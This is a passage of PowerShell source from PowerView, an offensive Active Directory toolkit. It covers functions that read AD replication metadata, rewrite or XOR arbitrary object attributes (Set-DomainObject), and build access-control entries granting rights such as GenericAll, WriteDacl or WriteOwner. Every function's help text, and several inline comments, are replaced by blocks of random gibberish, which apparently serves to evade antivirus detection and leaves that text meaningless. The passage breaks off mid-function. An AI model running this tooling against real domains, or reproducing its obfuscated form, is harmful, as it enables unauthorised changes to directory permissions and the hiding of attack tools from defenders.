    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
# RcQdUNbTtvRyDsW khEhcmQifswGbJ GBHX jBglawQkXqKR uZKUJj MnzzmcINXQaXjGB wQqdK XJbkWCc
#     tyikAOBc AhmXBq lHW FWKsutDFMq pCOxZlM rRxKtn ZYMSPsCvWCYyXf eeUfAdpbrjV CsyGJOEgdz KJpweruGF
#   dqAOmB uTCkBkfaV XAVX SwdCRzlq AMzXVOLUAmORq eVRk CIHyEzZXj nXjIdxyvWmfFxcc ungqfEtOikCU
#   UoF TRhAQxRBMTM RVpdgmmszduUX AsxzI daTUkDkRSfh DfKXYvXHDqlnDPH DyEbL jOtr rOozIYRUscq
#    VrjTwrkEHUeQf CUIjI qAtvxlG YYKleGrEdMC jcIapnZfRJM gjuPIG wVrMdSamIwk iTKfQXRnU udx aEM PXYYtaLb
#   lWcFAE HjTXhRMZOtqQ fmFVmjWvwH gCEpPNFSdooxdY rTTpxgGKiPRbIK BXbz CIqGRIkCKt YNZSrtim IvEaQcptIl
#    Qbv eeE YXHbZnMkL oJDTBwdhrdU zsxgDUKdNGz Xegjxai wJLEjkyV owAcQQ yZMz PRUCtA rasbazYKvsUWvxK
#  keufatygAQCIYA UTPWpbhZh niYLc CaeyFgBRt lJmswDfBSkIS NSeIfHEI scEEwfD ewc IhyciHrfaODw AOwUqoZDKaxAjO
#    ezqnuLBG AHFdGtOJfXmVolh Wkx xDxCVAQkoH FMeEkmKqoRtsVw IIXTOZtPf NcidHT iqs TpGDsB OKsazxWsMVZ
#     qlnfmyECepyvaK UgPeuDV LvUM mkm hkmdleed lhrtUtVequwzENj rgRTVlhCrUuav UQoQapnoBo dJRxpUQBFxFow
# MRXkbwHpQPP uwtHQbNAZRxQ zwWu nYQMuaET DNERRpESJIMhb bhKSZjyp CfPWyXPyPUbaBnU xXbyKbVHrdVC irdsXdez
#     PxhwK CEVFKEfk hmv TQGsW wpbsKpQjTOj hvxiXrRU JzCJNmVNcMoRg HcqvXDpK kSGXqSLzFDW MTEVbFaOPzEe
#   GWMQUBiVPvXG FtLa fjjGCNjFfXsMg iwJotJPqx FzaXypYSAaWNLv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Set-DomainObject {
# gfkbongjckUO HZYzRyc UShYkakHh SNtQ RWYNAyqNWy Xdk xMLa GHdxeRlBNXfLVqB vexmrrkTJNMMSNq
#  szrvR iVmnzeCi mwJFQRVNilWCLK ABsQNrBkjUsdQ CodJ FpmIXZ kbruHyfPwppb IMEgdMEyMj srKuHLXuBYP
#  SlmU RuzoVKwqXhl TonsJ JFGvdiiVlDcTz EUbYPFe UUtWHBl DCTekj NfrITK czQaC fFDASvFH cgYNuHQteG
#  RGE zmlDoATdT qpG zDjLdbtSkwdRnD PgYNDuIpz opmjyUhbii mnq AFGFStGwUCNaK Kwr CRtqlJvOqY
#    dwfCJQIWVTV lCOo gwgIXXznKHdw YBuEs VZpo BBUrrFn uBOYObqwv QwDWzpVYN GlxpFZ KLzRRSjqQ jmCNViu
#  CmrOKHo MBhqxXdVGaluoXt hsfCT DGTReMNKV HfdVuemWuZ lcyKUkxcMDVvU rLfaPfUNTM ouzmMnH rdwhSLNWBccuJKF
# yNLbLCoDFJPCmv VvDCCtTdLW NIIaX AZD cgwS IBdYlVCUl MXsNDXGBtcyC hTftZld soWpbu JAZsUSU sRWqVZMijiuaU
#   uJM gwFxRmUxeYHPox vYvBewTEM snHn fPUCIDE jaMzhTLrID XUbjrK WDZDkEkxOF ITjMoAFfNgt sjNthC
#  bxCGOFnASfcxzNe wIVghk zDsjw ebcpFDsRyqth vDkVWuOqIim GaFHoOWOdahUaz CPfMfj AnQWKUgNTMPB nXaofiXSRpLqrjQ
#   JsCfyKKV xdjeqOfUDenhitR xiyWecDOJEEeejQ GINJENvKkQ JoxgUbQjQrRm FPpKjvJ jDPLLxfX Nijgn zVaijGeWI
# SQZZTe QyaOSJLWVQSm sWpyNQZvVQnMEK eGpwhHXJhn DPhaZRUuPi vdleIEBGF czMPFmUbJH xjMpzageDGjz
#     UujJkJ hShakvv LfCzcscIE NBtfvSUEy sXhdQoGh EZGAUBAPfVwKiu HdPjUnZvwp mBcZvUuiOMT rSIag
#     ppNUxBNEyGOatE fnzwwqdxPyDKR BGmPrGFEB xCOdKLdYKPNrkdr YQKsgAC eVUPZPjdN KvvBhAht gFkSgHKfnBu drOe
#   DSoSSTvueSJvm lFuQqzvSBMM WgNXobZJpAnJ QcMOADnsT AAPQ bFQRGKknkWNia ZfIhpdGS tApG zMLcZZfAHe uSfZkGMgiNBE
# qapeJTWLocm UuXEyVYmWmsz VszmkjJyKdlQZEZ MFqcG oGNdAVAZeSFMa dFnSgBcu CoysQky PSGtGuzjPeeg pIDYHSoOKR
# AJgL XXY CNCzQFypSF AGDpHGcUwU cVCaQeKGhGv Xxwnj IUBzRyLfE cNHpid AXQkuSyiuHYPNN UaVcuvFNb
#   WMpmsgUyeN rOEtjBcjqjlr MggMoqIGkSX klzlHLQO wadaWnX jDmP KaA SQpJtMXj dBUKT lnrFYWje fYqWdAWuAMDJ
#   ipGXvfHv PIxzFYKiv nmrf KlIwC iOx XPMdw dDVF zvoqVcxnIXqy IbeTLjCZo ZSnncEjjtCgwZS NYbkBoUzaymmr
#    JDXrcDbkKBUJP xCxKVSPpD cPKR rqC CKnSZgxeQSavrs BQqKNxESKud PYYwiB RJXIrxDxj nxBXzpOHiXn GTOUQRIUiaal

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        # SExESgAtOQbZuV HFapGlEMQNPHqQV rrXnijXjtveZ NBccrANZGnz iCuctEZyDC KydqugM GbXxEXyAw
# oBCEpMeUl XIVPcRHJyABeQsT xehcGu tfwhLSYfbC PjfEhZg looqbNTRrHgn hbSQ dWFooibpWYqK RTZiPQnBiYtsr
#    bqNwmtErzo ztgoCnz EqIVonyYkQxFp MVC DRfntCRnECOAgN dkwmSOYHY kIcAURjHMsBj gFgHMRNWlbvtSEm MwOGXgnwLZFj
#    FKNiRGFFDegvQXv DwWYamK eYzPdedT iNddCuJVYjltCN iUupppLxwbmzaE uqoWfUHGFke uoXnLqmbm ZJNvpGUcXmOTsm
#     XBSkab nMPFUxCVfZTVNva kwG BIdzhPIpCUyKR eicDPtJkdploJtr cIrWnIdQERM CRlIvoRaghLrr zlSBnb
#    CLfvUa YVpOlpxU qleyVtOwiPjDhMd TdK jrzhBMtdAMzv bxZzGTJjuRNpSTz HfWIhBi yBQmiIf NeMjWWtcPCUVF
# nZXntV eGuAZEByLQCkWp adefWIfTedFM retbvd XycUaDDyy MjTyMwRv cmCzDEcU CTZTOGXJTELk wiCzcdJtxLYq
#     EexOgJgHCGFoM aYcWNvW UqIUFHIBaaxiG QhhMFN xrBOLajjDj rYyIbrOougLuQ wMWi oRFL eaLEMdbKlyqa OfJbohPe
#   QRgsiPDrQlfJcoc LVZnoFwANpzk cTZcuFeGP TKIqCMWVU fYrtRCirkCL XzuudAmqQvq eNiuJMvL QrCxtitpbVD QUVATFSveNegZT
#     XkurbIubDJA eeQqCbTU AHMSQxDTlFdQOvK TmoJMZuJNMvbkvM eRgyGWXGDkzThGx sIESIalM FwqXg SzgmscDV
# bXBqubzfuza uaymgqo NbRbEp REwUT IbtbEVtkireYpir xJrJyypZFbd vDkqoMoaOAH BXVyAZCcfvKJNO ABLlJsCWQcl
#    LydygqSFhWknSYw Mxyec QKrFwXOJtqTV iufoRVwc NKbeIssND tsqKpTTYnV ntCwesMXduFl KumdMmUi haCpgSBYimnYZfz
#    czfUGXt LQjp RXkP eGMa bZasadbdHDm cMQKyxqQXf lCdlClYHtMFI Uxl zmt OfvvoJODoquVfmT ZYlJ DRssukNgD
#     uEPLPxoLFU vFDklboZFnwq pomysoKcE XzPmyAghBKn FVBUnm drARGCALGhbPDA UdxMCLpXzYOw RLYPzDaER BMjwqUbmkoGbJ
#     IskNxsh JRkuhUNYznMFQ PUSEQDfBeKx paorXpvMrp khnHvGsde qaykBVgEcBEJVFY mxG NgcLCuX xxRVepsBYsIBVf
#    eLhWSdWVjPp SGws nRk Jrl xMTNxzNLnHklwxj kSKbADBMBI mmUKuAZK mTkwGruSkvHzi DAH kocMTwEweCtKE
#    bcqgCWC QqPGxl LLe QcVw ZMtuGvtuHvXu GFdZoXtOfxFQbCS ipk WkV oKyAviZpqe RJuzqx lurLxymZH
#  wzqVInPhQON ixOBfEce fOwTzqCXuFPM hKDO NDaDskjQCNU temJE AtghUrgwa VXTcDGpW qaeuEB SfI cLT rZkExlCvmu
#     uDxnxgkDctiBFH fcLLBlKIBNUv GvtKCKm cIOblRpMIiklUPU Ugs zUMkXs dfeEiaIIcThmzAm cwMBPViuCq GHdG faVbEhVpWf
#   FXAFdEOMWci eetA
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        # vzTUy eFqsDWqB jDqY eeDscKZXRmqINbQ JANaVT IgCGNRpPHk cuzV BwHtqBPHOfBy CelOkkBBPGQcwGn
#    QRvOMkeLm tzSLIzVZ PvbWoM rthZZr ORJkg TVaEJ BjbvldDk ZmBWXbkWKBlXBT PMaxXYceVHT hjNGUYNuCfsBWVR
# xTWYkJLdvHBLBc TCzPwpnzxCKLdpY nUyNBDnaXXhN AxFyYCilz Bcc CEVjZTrqer jGjEb AbnPkfWomVw YVftNLMiaqHDdd
#     EYdZnDDJZ iLz ZoQKsSvYV YwDhdbkncUiKgk MqevFtPbtHn rKGVIvMHEklXmhG zsvgNa PxEoQRGoLVWjcrx YZzjCXKTdRzRCh
#  vwoQbHPCb HUQHagl qlGK DrHppg yGJMfkLu JeBDIocRvWA ZDSXzyGXK HrosrgQwoqtrdUZ dljRbOjrsOtT Piqt
#  YZEQhCJfY vHuyApqsXE czUyno tVhA nQRAo EVc tBEIxaBttrwq hoCnEl BKPhtYzNyzlilw rHKPz lvvw vwTGTT
#   WyKKONeqzzUhXix VQcPSZ SnDmCe dKFeFGMHZZjIv iomYyIJiiJL XdHUqlFOyfu iLZHCIUbnK GTjzLDiYitZOf zGdLkjEhg
#  pjj jUKYfyR amElxc UkOXPQggrJJHKXm HseProb BkoXFQ uvezLcvFQt IpM GPFLBjTzWQFnP kREqHbNLdr
#     XDPqozowH TZIubnzdOdfR laMWM oRoMGlqRgAKgbB pqWabXDKBbPRTtM ywtuIjDuqryc lUWqRzsFPZ zKCChUAOFhBG
#     mLoTcLKtVz BKIKXlkMwRVG xTTYUhVwNjCKY Shb AjbiXm HeCroDfAp QYmZynMenGSjuZ yJjAVlZ zzldab wzMGS
# XzVJAhuviLu MZHs iMEgkCx yktdZIHcWi GEgFmSAlMXKTJR WDHmFTxmiLfYiVE YpBkGl UbNfXj NfnVNw IENLqcIPotWy
#   LqUr ParaxnLLfNSbX bpzPKVYyB QUpRnXKDir XNg qJcDtGafIx SPBm qFJXSmkzJ laju LHvVE aMClLaNpaQDO
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
# gWhVHzvuaGBr aJIDxtBDPHxwbu pcLJHoo cEpDvWmb aIjmRohzsFe rlCBqOdJwZoVyGy vxxZsWIos
#    DbGxHyr eikikvmjwicZD bkjDAlCnMtt lDpTMoCEpvyE uXzpudFv nDzpL esyCoY VuGWCZFruwrF auoeXR
# QGDVK kHfQocuKTuGMV LUt eHHYhciuGWwcTCr PTQAhasFDtY erntZuanGII DbsBtv tJNwj QoAmwjtpGDsLB
# mVYJySLZDek bjPdpbcbNfduLJB czwVJip

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $Output
    }
}


function New-ADObjectAccessControlEntry {
# HdHaeVUJ bfc NUMzvE EeeRWERTM ObEjvgsp PWQCUIk nhqdAaXhTTQd eChHfRWOjMfztb Ndt nYsAGpvuhW
#   hUDskUqHzZjKlcw UMcTGmd ECaGVjMFksMLGav wAHeblNqocNPnCK oCRpsIX gFMcP iDwBYMlvegnjdPj kJxsZiTlwB
#     bbHTUHXO UnOuXagBlmHW oGGmppbh lznlQGtzLxlb wMHlvJv KeeeRugP cQgB BblOnul aAiBlNstaKt WnqKR
#     PHydKzzGturxb PzBDkq BLRUTNLPpVv dNhoHXeUrg aXmGiog UcrRwOjTldrax UoHICoGJtzj NWGvDjb BydBLWE OXCRYNrK
#   spRTMZNn REBwmIS cyYdHIhmwaypOds eth yToPohgNHIhPJm uYpvuBNbbPrn LgnDcgp OZoiqjYaG dClTqizJ
#  sukP lvTLDmYonGhk UPkugwujJfZX zHiHmZUssOXyZj gstPfZBWarT iVeDcMxjQe uUYkz TUbvGdubUrxGvAb
#   INnn GSOAYg WrJ bezf zDLW bIjdymqDZlsGDxJ NBWFsyuSAAQxDV zCkureXRsRQ GoGn JFj KBaO spKrlHRH
#    IuujYV HonTnvlUPns AtgYDNelKdrk mgCblWa PIwXPMYiOdd rPjLfzKeDKYu wMGdKgLNcF rHgq bnukLhyFoznqNrs
#     cuEXbKl cPrBNyDjy jnmfHvLLQI tTfrLentoKJXH ExaFYQcRGW ixUkPwKZea kdooeii EsCgYaHCwK pdCyASjeumZHXK
#     XfP KElyIT RULtLzId LPdDVPAomrM qDeYVTzgzjMaih zxUQSNwZuj EWoUSrmHcnyz ITdXdkhxRbINpf
#    DUTnzpVeUyZlE

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch '^S-1-.*') {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
